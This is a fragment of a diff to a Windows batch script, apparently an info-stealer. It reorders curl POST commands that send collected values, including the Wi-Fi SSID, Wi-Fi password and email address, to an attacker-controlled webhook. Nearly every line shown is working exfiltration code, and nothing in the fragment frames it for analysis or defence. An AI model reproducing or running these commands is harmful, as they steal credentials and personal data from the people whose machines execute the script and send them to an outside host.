@@ -59,6 +59,6 @@ cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ssi
 cmd /c timeout /t 0 > nul
 cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipasswd%\"}" %webhook%
 cmd /c timeout /t 0 > nul
-cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
-cmd /c timeout /t 0 > nul
 cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%email%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
